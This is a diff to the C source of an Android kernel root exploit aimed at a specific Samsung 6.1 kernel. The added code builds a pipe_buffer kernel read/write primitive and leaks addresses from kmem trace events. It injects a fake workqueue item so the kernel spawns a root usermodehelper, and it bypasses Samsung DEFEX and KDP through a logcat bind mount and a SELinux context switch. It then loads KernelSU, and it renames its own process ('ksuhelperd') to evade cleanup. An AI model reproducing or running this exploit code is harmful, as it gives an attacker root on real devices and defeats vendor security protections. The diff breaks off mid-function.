@@ -73,127 +73,15 @@
 #define VMA_COUNT 50000
 #define HELPER_STACK (1 << 20)
 #define LOCKERS 3
-#define PAGE 4096UL
 #define SOCKBUF 8192
 
-/* aurora 6.1.75: do_timer_create+0x9a, return address of the
- * kmem_cache_alloc(posix_timers_cache, GFP_KERNEL|__GFP_ZERO) call. */
-#define STATIC_TIMER_SITE 0xffffffc008194fe0ULL
-#define TIMER_SITE_LOW21 0x184fe0ULL
-/* posix_timers_cache object: sizeof(struct k_itimer) on this build.
- * The cache has no SLAB_HWCACHE_ALIGN, so bytes_req == bytes_alloc. */
-#define TIMER_ALLOC 0x108ULL
+/* All kernel-build-specific constants (sites, cache sizes, struct offsets,
+ * link-time symbols) live in offsets.h; only exploit tuning stays here. */
+#include "offsets.h"
 
-/* cred_jar: sizeof(struct cred) (176) and the HWCACHE_ALIGN bytes_alloc. */
-#define CRED_REQ 0xb0ULL
-#define CRED_ALLOC 0xc0ULL
-
-/* aurora 6.1.75 link-time addresses (symtab) and BTF field offsets. */
-#define SELINUX_STATE_STATIC 0xffffffc00a5ea4a8ULL
-#define PANIC_ON_WARN_STATIC 0xffffffc00a2eac00ULL
-/*
- * workqueue UMH injection (fusion-s24u install_workqueue_umh_root, ported
- * to this 6.1 kernel's offsets).  A fake work_struct whose func is
- * call_usermodehelper_exec_work is linked into the idle system_unbound_wq
- * pool worklist; the kernel then spawns our helper as a legitimate root
- * usermodehelper, which sidesteps Samsung DEFEX entirely (no cred forgery
- * for it to catch).  Offsets verified against vmlinux.elf disasm:
- *   wq->dfl_pwq 0x110 (a2+272 in __queue_work)
- *   pwq->pool 0x00, pwq->wq 0x08, pwq->work_color 0x10 (dword+16),
- *   pwq->nr_in_flight 0x1c+4*color, pwq->nr_active 0x5c, max_active 0x60
- *   pool->worklist 0x28, pool->nr_idle 0x20 (v3+32 in process_one_work)
- *   work->data 0x00 (pwq|color<<4|5), work->entry 0x08, work->func 0x18
- */
-#define SYSTEM_UNBOUND_WQ_STATIC 0xffffffc00a2eac58ULL
-#define UMH_EXEC_WORK_STATIC 0xffffffc0080d4584ULL
-#define WQ_DFL_PWQ_OFF 0x110
-#define PWQ_POOL_OFF 0x00
-#define PWQ_WQ_OFF 0x08
-#define PWQ_WORK_COLOR_OFF 0x10
-#define PWQ_NR_IN_FLIGHT_OFF 0x1c
-#define PWQ_NR_ACTIVE_OFF 0x5c
-#define PWQ_MAX_ACTIVE_OFF 0x60
-#define POOL_WORKLIST_OFF 0x28
-#define WORK_DATA_OFF 0x00
-#define WORK_ENTRY_OFF 0x08
-#define WORK_FUNC_OFF 0x18
-/*
- * subprocess_info / completion layouts (fusion-s24u root.c, layout matches
- * this kernel's struct subprocess_info: work(48) complete path argv envp
- * wait retval init cleanup data).
- */
-struct umh_completion
-{
-    unsigned done;
-    unsigned pad0;
-    unsigned lock;
-    unsigned pad1;
-    unsigned long long next;
-    unsigned long long prev;
-};
-struct umh_kernel_data
-{
-    struct umh_completion completion; /* 32 */
-    char path[256];                  /* the helper binary to exec */
-    char arg[16];                    /* "--umh" */
-    char uid[16];                    /* decimal client uid */
-    unsigned long long argv[4];
-    unsigned long long envp[1];
-};
-struct umh_subprocess_info
-{
-    unsigned char work[48]; /* work_struct: data/entry/func */
-    unsigned long long complete;
-    unsigned long long path;
-    unsigned long long argv;
-    unsigned long long envp;
-    int wait;
-    int retval;
-    unsigned long long init;
-    unsigned long long cleanup;
-    unsigned long long data;
-};
-#define ROOT_UMH_WORK_OFF 0x400  /* fake work_struct inside the reclaimed page */
-#define ROOT_UMH_DATA_OFF 0x800  /* umh_kernel_data inside the reclaimed page */
-#define ROOT_UMH_PWQ_OFF 0xa00   /* fake pool_workqueue inside the page */
-#define ROOT_UMH_PATH "/data/local/tmp/w/uhelper"
-/*
- * DEFEX credential-violation bypass: task_defex_check_creds() calls
- * get_task_creds(), which looks the task up in creds_fast_hash
- * (0xffffffc00a66e9f8, .data — writable, unlike the creds_fast_hash_ready
- * gate in rodata).  A NULL bucket entry makes get_task_creds return
- * stored uid 0, which matches the forged uid 0, so check_creds returns 0
- * (no violation) via the +0x740 path ("mov w0, wzr; ret", verified).
- * creds_hash is an 8-byte pointer array indexed directly by pid when
- * pid <= 0x8000.
- */
-#define CREDS_FAST_HASH_STATIC 0xffffffc00a66e9f8ULL
-#define CRED_UID_OFF 0x4ULL
-/* securebits: clearing it drops Android's SECURE_NOROOT, so an euid=0
- * exec grants the bounding-set capabilities again. */
-#define CRED_SECUREBITS_OFF 0x24ULL
-
-/* task_struct::cred and dup_task_struct()'s task_struct_cachep call site. */
-#define OFF_TASK_CRED 0x838ULL
-#define TASK_ALLOC_LOW21 0xacb7cULL
-#define TASK_ALLOC_BYTES 0x12c0ULL
-/* Unslid call sites (from vmlinux.elf): prepare_creds' kmem_cache_alloc
- * return address and dup_task_struct's kmem_cache_alloc_node return
- * address.  The runtime slide is 64KB-granular, so sites are matched as
- * site_static + slide. */
-#define CRED_SITE_STATIC 0xffffffc0080e5e70ULL
-#define TASK_SITE_STATIC 0xffffffc0080acb7cULL
-#define FULLCAP 0x1ffffffffffULL
-
-/* Link-time symbols for the fake cred's refcounted sub-objects. */
-#define ROOT_USER_STATIC 0xffffffc00a310a00ULL
-#define INIT_USER_NS_STATIC 0xffffffc00a310770ULL
-#define INIT_UCOUNTS_STATIC 0xffffffc00a3121d8ULL
-#define INIT_GROUPS_STATIC 0xffffffc00a311d20ULL
-/* Only capability/selinux/integrity are built in and only SELinux wants a
- * cred blob, so lsm_set_blob_sizes() leaves its offset at 0. */
-#define SELINUX_BLOB_OFF 0x0ULL
-#define SELINUX_SID_KERNEL 1U
+/* (selinux_state / panic_on_warn / workqueue-UMH constants: offsets.h) */
+/* (umh struct layouts + ROOT_UMH_* page slots: offsets.h) */
+/* (DEFEX creds_hash, cred/task field offsets, init_* symbols: offsets.h) */
 
 #define CHILD_HELLO 0x52445931
 #define CHILD_MAGIC 0x50474552
@@ -227,6 +115,21 @@ static unsigned long long g_child_task;
 static int g_umh_stage;
 static unsigned g_t_page_alloc, g_t_page_free;
 
+/* pipe_buffer kernel r/w primitive + UMH injection state. */
+static unsigned long long g_pipe_addr;        /* leaked pipe_inode_info */
+static unsigned long long g_pipe_bufs;        /* its original bufs array */
+static unsigned long long g_pipe_target_page; /* vmemmap struct page * */
+static unsigned int g_pipe_target_off;
+static int g_pipe_self;
+static int g_pipe_write;
+static int g_umh_pipe;
+static int g_umh_dry;
+static unsigned long long g_umh_wq, g_umh_pwq, g_umh_pool;
+/* Running kernel image phys base (unslid base + slide) and DRAM phys
+ * base; see offsets.h. */
+static unsigned long long g_kimage_phys;
+static unsigned long long g_memstart = MEMSTART_ADDR;
+
 static void logf(const char *fmt, ...);
 
 static void slab_usage(const char *tag)
@@ -251,7 +154,19 @@ static void slab_usage(const char *tag)
 
 static void logf(const char *fmt, ...)
 {
+    /* [+ms] elapsed-since-first-log prefix: makes the per-stage cost
+     * (leak, each plant, each repair, late-load) visible in the log so
+     * the slow spots can be measured instead of guessed. */
+    static struct timespec t0;
+    struct timespec now;
     va_list ap;
+
+    clock_gettime(CLOCK_MONOTONIC, &now);
+    if (!t0.tv_sec)
+        t0 = now;
+    long long ms = (long long)(now.tv_sec - t0.tv_sec) * 1000LL +
+                   (long long)(now.tv_nsec - t0.tv_nsec) / 1000000LL;
+    printf("[+%5lld.%03llds] ", ms / 1000LL, ms % 1000LL);
 
     va_start(ap, fmt);
     vprintf(fmt, ap);
@@ -290,7 +205,34 @@ static unsigned long long u64(const unsigned char *b, size_t o)
 
 static void enable_events(void)
 {
+    /*
+     * The per-cpu trace buffer defaults to a few kB and the kmem events
+     * flood it in milliseconds on a busy system, which starves every scan
+     * (discover_page_types sees partial alloc/free pairs).  Grow it first
+     * so the payload is self-contained instead of relying on the app to
+     * have done it.
+     */
+    wr(TR "/buffer_size_kb", "8192\n");
+    /*
+     * Event triggers persist in tracefs across runs (and even reboots of
+     * the tracing state), and re-registering a trigger that already exists
+     * fails with EEXIST.  A leftover "disable_event:kmem:kmalloc" from an
+     * earlier run keeps firing on rss_stat and silently turns the pipe
+     * leak blind, so remove every form first (ignore failures), then
+     * register the enables.  The bare syntax is correct; the ":unlimited"
+     * suffix is just how tracefs displays the parsed trigger count.
+     */
     static const char *evs[] = {
+        "!disable_event:kmem:kmalloc\n",
+        "!disable_event:kmem:kmem_cache_alloc\n",
+        "!disable_event:kmem:kmem_cache_alloc_node\n",
+        "!disable_event:kmem:mm_page_free\n",
+        "!disable_event:kmem:mm_page_alloc\n",
+        "!enable_event:kmem:kmem_cache_alloc\n",
+        "!enable_event:kmem:kmem_cache_alloc_node\n",
+        "!enable_event:kmem:mm_page_free\n",
+        "!enable_event:kmem:mm_page_alloc\n",
+        "!enable_event:kmem:kmalloc\n",
         "enable_event:kmem:kmem_cache_alloc\n",
         /* dup_task_struct() allocates via kmem_cache_alloc_node; without
          * this event the child task_struct address is never traced. */
@@ -300,6 +242,70 @@ static void enable_events(void)
     };
     for (unsigned i = 0; i < sizeof(evs) / sizeof(evs[0]); i++)
         wr(TR "/events/kmem/rss_stat/trigger", evs[i]);
+}
+
+/*
+ * kmem:kmalloc is deliberately not enabled globally: it fires for every
+ * kmalloc on the system and floods the trace buffer, which buries the
+ * page events discover_page_types needs.  The pipe leak wants it for a
+ * few milliseconds only (pipe_inode_info is a kmalloc object).  Switching
+ * between the enable and disable trigger forms needs the other form
+ * removed first -- re-registering conflicts with EEXIST.
+ */
+static void set_pipe_events(int on)
+{
+    const char *want = on ? "enable_event:kmem:kmalloc\n"
+                          : "disable_event:kmem:kmalloc\n";
+
+    /*
+     * Switching between the enable and disable trigger forms needs the
+     * other form removed first (re-registering conflicts with EEXIST),
+     * and the whole dance is verified from the trigger file: a leftover
+     * trigger from a killed run silently keeps kmalloc off and the pipe
+     * leak then sees nothing.
+     */
+    for (int t = 0; t < 3; t++)
+    {
+        FILE *f;
+        char line[128];
+        int ok = 0;
+
+        wr(TR "/events/kmem/rss_stat/trigger",
+           on ? "!disable_event:kmem:kmalloc\n"
+              : "!enable_event:kmem:kmalloc\n");
+        wr(TR "/events/kmem/rss_stat/trigger",
+           on ? "!enable_event:kmem:kmalloc\n"
+              : "!disable_event:kmem:kmalloc\n");
+        wr(TR "/events/kmem/rss_stat/trigger", want);
+        f = fopen(TR "/events/kmem/rss_stat/trigger", "r");
+        if (f)
+        {
+            while (fgets(line, sizeof(line), f))
+                if (!strncmp(line, want, strlen(want) - 1))
+                    ok = 1;
+            fclose(f);
+        }
+        if (ok)
+        {
+            /*
+             * The trigger only takes effect on the next rss_stat event;
+             * force one so the enable/disable lands before the traced
+             * window instead of somewhere inside it.
+             */
+            void *q = mmap(NULL, PAGE, PROT_READ | PROT_WRITE,
+                           MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+            if (q != MAP_FAILED)
+            {
+                *(volatile char *)q = 1;
+                munmap(q, PAGE);
+            }
+            usleep(1000);
+            return;
+        }
+        logf("[!] kmalloc trigger %s not registered, retry %d\n",
+             on ? "enable" : "disable", t + 1);
+        usleep(20000);
+    }
 }
 
 static void drain_cpu(int cpu)
@@ -502,6 +508,95 @@ static int scan_task_allocs(const unsigned char *b, size_t n, int pid,
         found++;
     }
     return found;
+}
+
+/*
+ * pipe_inode_info leak for the pipe_buffer r/w primitive: after pipe() the
+ * kmem trace shows kmalloc(pipe_inode_info) (req 0xb8 / alloc 0xc0) and
+ * the bufs array (req 0x280).  Both addresses are needed: the plant
+ * repoints pipe->bufs, and the restore writes the original back.
+ */
+static void scan_pipe_alloc(const unsigned char *b, size_t n, int pid)
+{
+    for (size_t i = 16; i + 24 <= n; i += 4)
+    {
+        unsigned long long ptr, req, alloc, site;
+
+        if (u32(b, i - 12) != (unsigned)pid)
+            continue;
+        ptr = u64(b, i);
+        req = u64(b, i + 8);
+        alloc = u64(b, i + 16);
+        site = u64(b, i - 8);
+        if (!is_kernel_ptr(ptr))
+            continue;
+        if (req == 0xb8 && alloc == 0xc0)
+        {
+            g_pipe_addr = ptr;
+            logf("[pipeleak] info=%#llx site=%#llx\n", ptr, site);
+        }
+        else if (req == 0x280)
+        {
+            g_pipe_bufs = ptr;
+            logf("[pipeleak] bufs=%#llx alloc=%#llx site=%#llx\n",
+                 ptr, alloc, site);
+        }
+    }
+}
+
+/* Order-0 mm_page_alloc pfns for this pid, in trace order. */
+static int scan_page_alloc_pfns(const unsigned char *b, size_t n, int pid,
+                                unsigned long long *out, int max)
+{
+    int found = 0;
+
+    for (size_t i = 16; i + 12 <= n; i += 4)
+    {
+        unsigned long long pfn;
+        unsigned int order;
+        int dup = 0;
+
+        if (u32(b, i - 4) != (unsigned)pid)
+            continue;
+        if ((u32(b, i - 8) & 0xffff) != g_t_page_alloc)
+            continue;
+        order = u32(b, i + 8);
+        if (order != 0)
+            continue;
+        pfn = u64(b, i);
+        if (pfn >= (1ULL << 30))
+            continue;
+        for (int k = 0; k < found; k++)
+            if (out[k] == pfn)
+                dup = 1;
+        if (dup)
+            continue;
+        logf("[pipepfn] pfn=%#llx order=%u idx=%d\n", pfn, order, found);
+        if (found < max)
+            out[found++] = pfn;
+    }
+    return found;
+}
+
+/*
+ * The kernel image's physical load address (unslid base + slide) is a
+ * bootloader constant; see offsets.h.  It is validated read-only by the
+ * umh dry-run candidate loop instead of being parsed at runtime.
+ */
+
+/* vmemmap struct page pointer for a linear-map address. */
+static unsigned long long spage_of_linear(unsigned long long addr)
+{
+    unsigned long long phys = addr - g_base;
+    unsigned long long pfn = phys >> 12;
+
+    return VMEMMAP_BASE + (pfn - (g_memstart >> 12)) * STRUCT_PAGE_SIZE;
+}
+
+/* Linear-map alias of a kernel-image symbol (slide included via iomem). */
+static unsigned long long alias_of_kimg(unsigned long long sym)
+{
+    return g_base + g_kimage_phys + (sym - KERNEL_VA_BASE);
 }
 
 static int scan_page_free(const unsigned char *b, size_t n,
@@ -1067,6 +1162,8 @@ static void park_forever(const char *why)
     signal(SIGHUP, SIG_IGN);
     signal(SIGINT, SIG_IGN);
     (void)setsid();
+    /* Drop the obvious exploit name so cleanup sweeps do not target us. */
+    (void)prctl(PR_SET_NAME, "ksuhelperd", 0, 0, 0);
     for (;;)
         pause();
 }
@@ -1118,10 +1215,18 @@ static void write_ksu_script(void)
         "#!/system/bin/sh\n"
         "echo \"[ksu] begin uid=$(id -u) enf=$(getenforce)\"\n"
         "echo \"[ksu] ctx=$(cat /proc/self/attr/current 2>/dev/null)\"\n"
-        "KSUD=/data/local/tmp/w/ksud\n"
+        /* The parent only frees the spray pool (the forged cred lives in
+         * one of those pages) when this marker reads "done". */
+        "echo pending > /data/local/tmp/samtimer/cleanup.ok\n"
+        "KSUD=/data/local/tmp/samtimer/ksud\n"
         "[ -x \"$KSUD\" ] || KSUD=/data/local/tmp/ksud\n"
         "if [ ! -x \"$KSUD\" ]; then echo '[ksu] ksud missing'; exit 1; fi\n"
         "echo \"[ksu] ksud=$KSUD size=$(stat -c %s \"$KSUD\" 2>/dev/null)\"\n"
+        /* Version marker for the app's status card (matches "version=ksud").
+         * Through the bind mount only: a direct ksud exec is KDP-killed.
+         * The C side sets the mount up before this script runs. */
+        "V=$(/system/bin/logcat --version 2>/dev/null | head -1)\n"
+        "case \"$V\" in *ksud*|*kernelsu*) echo \"[ksu] version=$V\" ;; esac\n"
         /* late-load registers the module asynchronously; probe with a
          * settle delay like the reference does (sleep before grep). */
         "live() { sleep 1; grep -qi kernelsu /proc/modules 2>/dev/null "
@@ -1130,6 +1235,8 @@ static void write_ksu_script(void)
         "echo \"[ksu] live_initial=$LIVE\"\n"
         "if [ \"$LIVE\" = yes ]; then\n"
         "  echo '[ksu] already_live'\n"
+        /* Nothing new was spawned with the forged cred on this path. */
+        "  echo done > /data/local/tmp/samtimer/cleanup.ok\n"
         "  exit 0\n"
         "fi\n"
         /* If the C-side bind mount worked, /system/bin/logcat IS ksud
@@ -1158,11 +1265,54 @@ static void write_ksu_script(void)
         "done\n"
         "if grep -q '^kernelsu ' /proc/modules; then "
         "echo '[ksu] module live'; else echo '[ksu] module NOT live'; fi\n"
+        /*
+         * Cleanup -- the forged cred (a node in the reclaimed spray page)
+         * is inherited by anything forked from this worker, including the
+         * ksud daemon the late-load stages spawn.  The parent frees the
+         * spray pool after this script returns, so a survivor would keep
+         * a cred pointer into freed memory -- touched later it corrupts
+         * arbitrary kernel memory.  Distinguish by SELinux context: a
+         * forged-cred process reads "kernel" from /proc/self/attr/current,
+         * while a daemon respawned by init or started by the manager
+         * through the driver's root_execve carries a real kernel-issued
+         * root cred and reads init/ksu.  Kill only the forged ones (safe:
+         * their cred page is still alive at this point), and allow the
+         * drain to proceed only when none remain.
+         */
+        "echo '[ksu] cleanup: forged-cred sweep'\n"
+        "for p in $(pidof ksud 2>/dev/null); do\n"
+        "  C=$(cat /proc/$p/attr/current 2>/dev/null)\n"
+        "  echo \"[ksu] ksud pid=$p ctx=$C\"\n"
+        "  case \"$C\" in kernel)\n"
+        "    kill -9 $p 2>/dev/null ;;\n"
+        "  esac\n"
+        "done\n"
+        "sleep 1\n"
+        "BAD=0\n"
+        "for p in $(pidof ksud 2>/dev/null); do\n"
+        "  C=$(cat /proc/$p/attr/current 2>/dev/null)\n"
+        "  echo \"[ksu] survivor pid=$p ctx=$C\"\n"
+        "  case \"$C\" in kernel) BAD=1 ;; esac\n"
+        "done\n"
+        "if [ $BAD = 0 ]; then echo '[ksu] no forged-cred holders'; "
+        "else echo '[ksu] WARN: forged-cred holder remains'; fi\n"
+        /* panic_on_warn was zeroed through the raw-write primitive (and
+         * warn_limit with it); restore it the clean way. */
+        "echo 1 > /proc/sys/kernel/panic_on_warn 2>/dev/null\n"
+        "echo \"[ksu] panic_on_warn=$(cat /proc/sys/kernel/panic_on_warn "
+        "2>/dev/null)\"\n"
         /* Evidence that must survive a panic: the module's klog (KDP/RKP
          * detection, hook installation) is only in dmesg. */
-        "dmesg | tail -n 4000 > /data/local/tmp/w/dmesg_after_load.log "
+        "dmesg | tail -n 4000 > /data/local/tmp/samtimer/dmesg_after_load.log "
         "2>&1\n"
-        "echo \"[ksu] enf=$(getenforce)\"\n";
+        /* Early-warning counter: any kernel oops/WARN during the chain is
+         * a reason to distrust the run and reboot before reusing it. */
+        "echo \"[ksu] dmesg hazards=$(dmesg | grep -aciE "
+        "'Oops|BUG:|Unable to handle')\"\n"
+        "echo \"[ksu] enf=$(getenforce)\"\n"
+        "if [ $BAD = 0 ]; then "
+        "echo done > /data/local/tmp/samtimer/cleanup.ok; "
+        "else echo refused > /data/local/tmp/samtimer/cleanup.ok; fi\n";
     int fd = open("/data/local/tmp/ksu_stage.sh",
                   O_WRONLY | O_CREAT | O_TRUNC, 0755);
 
@@ -1220,6 +1370,45 @@ static int verify_ksu_control(void)
     return 0;
 }
 
+
+/*
+ * UMH action script, run as "/system/bin/sh umh_action.sh" by the injected
+ * work.  The usermodehelper exec must target a system-signed binary (a
+ * direct exec of a /data/local/tmp binary can be killed by KDP/DEFEX
+ * before its first instruction), and the script then performs the
+ * /system/bin/logcat bind-mount KDP trick and hands over to the stage
+ * script -- the BuSung-dev umh_action.sh pattern.
+ */
+static void write_umh_script(void)
+{
+    static const char script[] =
+        "#!/system/bin/sh\n"
+        "exec >/data/local/tmp/samtimer/umh-kdp.log 2>&1\n"
+        "echo \"[umh] start uid=$(id -u) "
+        "ctx=$(cat /proc/self/attr/current 2>/dev/null) "
+        "enf=$(getenforce 2>/dev/null)\"\n"
+        /* readiness marker first: the exploit parent polls for it */
+        ": > /data/local/tmp/samtimer/umh-action.log\n"
+        /* KSU's sepolicy only lets init reach the ksud domain */
+        "echo -n u:r:init:s0 > /proc/self/attr/current 2>/dev/null\n"
+        "unshare -m sh -c '\n"
+        "  mount --bind /data/local/tmp/samtimer/ksud /system/bin/logcat "
+        "|| { echo mount_failed; exit 11; }\n"
+        "  echo \"[umh] bind mounted kdp\"\n"
+        "  /system/bin/logcat --version\n"
+        "  exec sh /data/local/tmp/ksu_stage.sh\n"
+        "'\n"
+        "echo \"[umh] outer rc=$?\"\n";
+    int fd = open("/data/local/tmp/samtimer/umh_action.sh",
+                  O_WRONLY | O_CREAT | O_TRUNC, 0755);
+
+    if (fd < 0)
+        return;
+    (void)!write(fd, script, sizeof(script) - 1);
+    close(fd);
+    (void)chmod("/data/local/tmp/samtimer/umh_action.sh", 0755);
+}
+
 static int read_panic_on_warn(void)
 {
     FILE *f = fopen("/proc/sys/kernel/panic_on_warn", "r");
@@ -1246,11 +1435,164 @@ static void run_plant(unsigned long long target, int tag, int mode,
                       struct plant_res *res, unsigned char *raw,
                       unsigned long long static_target);
 
+/*
+ * Failed-plant zombie: the trigger's timer node is freed while still linked
+ * ("stale"), so a reap would run timerqueue_del on reused memory.  Instead of
+ * holding the zombie forever, make the reap safe first: posix_cpu_timers_exit
+ * walks each queue via its rb_leftmost pointer and skips a queue whose
+ * leftmost is NULL (verified in our vmlinux: LDR X20,[X19,#0x7A0]; CBZ).
+ * Zero the three leftmost slots in the zombie's task_struct with zero plants,
+ * then reap normally -- no zombie remains, so a dying holder can never hand
+ * stale nodes to init's reaper.
+ *
+ * Three zero plants, each retried; if any cannot land the zombie is held
+ * (g_held) exactly like before, so the old behaviour is the fallback.
+ */
+static int g_repairing;
+
+/* loginuid read-back for the repair probe (world-readable, unlike
+ * panic_on_warn which is root-only on Samsung builds). */
+static long read_loginuid(pid_t p)
+{
+    char path[64], buf[32];
+    int fd, n;
+
+    snprintf(path, sizeof(path), "/proc/%d/loginuid", (int)p);
+    fd = open(path, O_RDONLY);
+    if (fd < 0)
+        return -1;
+    n = (int)read(fd, buf, sizeof(buf) - 1);
+    close(fd);
+    if (n <= 0)
+        return -1;
+    buf[n] = 0;
+    return strtol(buf, NULL, 10);
+}
+
+static void repair_zombie(pid_t z, unsigned long long ztask,
+                          unsigned char *raw, int tag)
+{
+    static const unsigned long long slots[3] = {
+        /* queue leftmosts only: the posix_cpu_timers_exit walk reads the
+         * leftmost first and skips the whole queue when it is NULL, so the
+         * queue roots are never dereferenced -- zeroing them would just be
+         * three extra (and failure-prone) plants per zombie. */
+        OFF_TQ_LEFTMOST_0, OFF_TQ_LEFTMOST_1, OFF_TQ_LEFTMOST_2
+    };
+
+    if (!ztask || (ztask & 0x3f) || g_repairing || !g_slide_set)
+    {
+        logf("[-] plant%d zombie %d cannot repair (task=%#llx slide=%d) "
+             "-- held\n",
+             tag, z, ztask, g_slide_set);
+        g_held++;
+        return;
+    }
+    g_repairing = 1;
+    {
+        /*
+         * Round-trip probe first: the repair writes are kernel writes we
+         * cannot read back directly, and a "successful" plant is only a
+         * heuristic.  The zombie's loginuid (task+OFF_TASK_LOGINUID) is
+         * written through the same pipeline and read back through
+         * /proc/<pid>/loginuid, which is world-readable (panic_on_warn is
+         * root-only on Samsung builds and cannot serve as the probe).
+         * Mode 4's value is fully predictable ((V & ~0x1fff) + 0x1000),
+         * so the read-back is a byte-exact check of the pipeline; mode 0
+         * then proves the zero write.  Without a verified probe the
+         * zombie is never reaped: a reap with stale nodes is a guaranteed
+         * kernel panic.
+         */
+        struct plant_res r;
+        int a, ok = 0;
+        long got;
+        unsigned int want = 0;
+
+        for (a = 0; a < 3 && !ok; a++)
+        {
+            memset(&r, 0, sizeof(r));
+            run_plant(ztask + OFF_TASK_LOGINUID, 88, 4, &r, raw, 0);
+            if (r.ok)
+                ok = 1;
+            else if (!r.retry)
+                break;
+        }
+        if (ok)
+            want = (unsigned int)((((r.A - 0x78) & ~0x1fffULL) + 0x1000) &
+                                  0xffffffffULL);
+        got = ok ? read_loginuid(z) : -1;
+        if (!ok || got != (long)want)
+        {
+            g_repairing = 0;
+            logf("[-] plant%d zombie %d probe (nonzero) unverified "
+                 "want=%#x got=%ld -- held\n", tag, z, want, got);
+            g_held++;
+            return;
+        }
+        ok = 0;
+        for (a = 0; a < 3 && !ok; a++)
+        {
+            memset(&r, 0, sizeof(r));
+            run_plant(ztask + OFF_TASK_LOGINUID, 89, 0, &r, raw, 0);
+            if (r.ok)
+                ok = 1;
+            else if (!r.retry)
+                break;
+        }
+        got = ok ? read_loginuid(z) : -1;
+        if (!ok || got != 0)
+        {
+            g_repairing = 0;
+            logf("[-] plant%d zombie %d probe (zero) unverified "
+                 "got=%ld -- held\n", tag, z, got);
+            g_held++;
+            return;
+        }
+    }
+    for (int i = 0; i < 3; i++)
+    {
+        struct plant_res r;
+        int a, ok = 0;
+
+        for (a = 0; a < 3; a++)
+        {
+            memset(&r, 0, sizeof(r));
+            run_plant(ztask + slots[i], 90 + i, 0, &r, raw, 0);
+            if (r.ok)
+            {
+                ok = 1;
+                break;
+            }
+            if (!r.retry)
+                break;
+        }
+        if (!ok)
+        {
+            g_repairing = 0;
+            logf("[-] plant%d zombie %d repair[%d] failed -- held\n",
+                 tag, z, i);
+            g_held++;
+            return;
+        }
+    }
+    g_repairing = 0;
+    kill(z, SIGKILL);
+    {
+        int st = 0;
+
+        if (waitpid(z, &st, 0) == z)
+            logf("[+] plant%d zombie %d repaired+reaped (st=%#x)\n",
+                 tag, z, st);
+        else
+            logf("[!] plant%d zombie %d reap failed\n", tag, z);
+    }
+}
+
 /* One-shot non-zero-pointer write to an absolute (already slid) address. */
 static int run_plant_once(unsigned long long target, unsigned char *raw,
                           struct plant_res *out)
 {
-    for (int attempt = 1; attempt <= 3; attempt++)
+    for (int attempt = 1; attempt <= 5; attempt++)
     {
         memset(out, 0, sizeof(*out));
         logf("[+] stage once target=%#llx attempt=%d\n", target, attempt);
@@ -1269,7 +1611,9 @@ static int stage_write(unsigned long long target, int mode,
                        struct plant_res *out, unsigned long long static_target){
     struct plant_res r;
 
-    for (int attempt = 1; attempt <= 3; attempt++)
+    /* Retries pick a fresh victim each time (run_plant re-selects), so more
+     * attempts directly raise the success rate; a success costs one plant. */
+    for (int attempt = 1; attempt <= 5; attempt++)
     {
         memset(&r, 0, sizeof(r));
         logf("[+] stage %s target=%#llx mode=%s attempt=%d\n", what, target,
@@ -1294,7 +1638,11 @@ static int stage_write(unsigned long long target, int mode,
 #define SPRAY_THREADS 10
 #define SPRAY_SOCKS 4096
 #define SPRAY_PRE 4000
-#define SPRAY_POST 20000
+/* Phase 2 fires after the parent already sees the victim page free; the
+ * catch happens in phase 1's continuous writes (rate, not volume).  A few
+ * thousand post writes are plenty of margin -- 20000 just churned 1.6GB of
+ * skbs per plant and cost seconds across the chain. */
+#define SPRAY_POST 3000
 #define PIPE_SPRAY_N 128
 #define PIPE_PAGES_PER 4
 static _Atomic int g_burst, g_burst2, g_stop_spray;
@@ -1562,10 +1910,16 @@ static void run_plant(unsigned long long target, int tag, int mode,
         logf("[-] plant%d pipe failed\n", tag);
         return;
     }
+    /*
+     * Trace from before the fork: copy_process()'s task_struct allocation is
+     * what gives the failure path T's task address for the zombie repair.
+     */
+    trace_start();
     pid_t T = fork();
     if (T < 0)
     {
         logf("[-] plant%d fork failed\n", tag);
+        trace_stop();
         return;
     }
     if (T == 0)
@@ -1592,9 +1946,9 @@ static void run_plant(unsigned long long target, int tag, int mode,
         logf("[-] plant%d trigger never ready\n", tag);
         kill(T, SIGKILL);
         waitpid(T, NULL, 0);
+        trace_stop();
         return;
     }
-    trace_start();
     if (write(ack_p[1], "A", 1) != 1)
         logf("[-] ack failed\n");
     int etid = 0;
@@ -1607,6 +1961,31 @@ static void run_plant(unsigned long long target, int tag, int mode,
      * spray is already running when the victim slab returns to the buddy.
      */
     long n = read_cpu(g_cpu, raw, 48u << 20);
+    unsigned long long T_task = 0;
+
+    if (n > 0)
+    {
+        /*
+         * Only trust an unambiguous capture: the window must contain
+         * exactly one task_struct alloc for our pid (T's fork).  Anything
+         * else means the scan is matching something we do not understand,
+         * and writing through a wrong "task" address corrupts kernel
+         * memory -- so treat it as no capture and hold instead.
+         */
+        int tcnt = scan_task_allocs(raw, (size_t)n, (int)getpid(), &T_task,
+                                    g_slide_set
+                                        ? TASK_SITE_STATIC +
+                                              (unsigned long long)g_slide
+                                        : 0);
+
+        if (tcnt != 1 || !T_task || (T_task & 0x3f))
+        {
+            logf("[-] plant%d task capture ambiguous (n=%d task=%#llx)\n",
+                 tag, tcnt, T_task);
+            T_task = 0;
+        }
+    }
+    logf("[plant%d] T=%d task=%#llx\n", tag, T, T_task);
     unsigned long long kept[NTIMERS];
     unsigned long long V = 0, site0 = 0;
     unsigned long long vslab;
@@ -1794,7 +2173,8 @@ static void run_plant(unsigned long long target, int tag, int mode,
 
             memset(&ud, 0, sizeof(ud));
             snprintf(ud.path, sizeof(ud.path), "%s", ROOT_UMH_PATH);
-            snprintf(ud.arg, sizeof(ud.arg), "--umh");
+            snprintf(ud.path + 16, sizeof(ud.path) - 16, "%s",
+                 ROOT_UMH_ARG);
             snprintf(ud.uid, sizeof(ud.uid), "%u", (unsigned)getuid());
             {
                 unsigned long long completion_addr =
@@ -1815,8 +2195,8 @@ static void run_plant(unsigned long long target, int tag, int mode,
                     __builtin_offsetof(struct umh_completion, next);
                 ud.completion.prev = ud.completion.next;
                 ud.argv[0] = path_addr;
-                ud.argv[1] = arg_addr;
-                ud.argv[2] = uid_addr;
+                ud.argv[1] = path_addr + 16;
+                ud.argv[2] = 0;
                 ud.argv[3] = 0;
                 ud.envp[0] = 0;
                 (void)envp_addr;
@@ -1903,10 +2283,82 @@ static void run_plant(unsigned long long target, int tag, int mode,
             logf("[+] plant%d arb write target=%#llx value=%#llx\n",
                  tag, target, page + 0x1000);
         }
+        else if (mode == 6)
+        {
+            /*
+             * Pipe read/write primitive (RiosWesley design).  rb_erase
+             * writes our page address into pipe->bufs; the parent+8 side
+             * effect lands on fake buffer 0 (unused because pipe->tail is
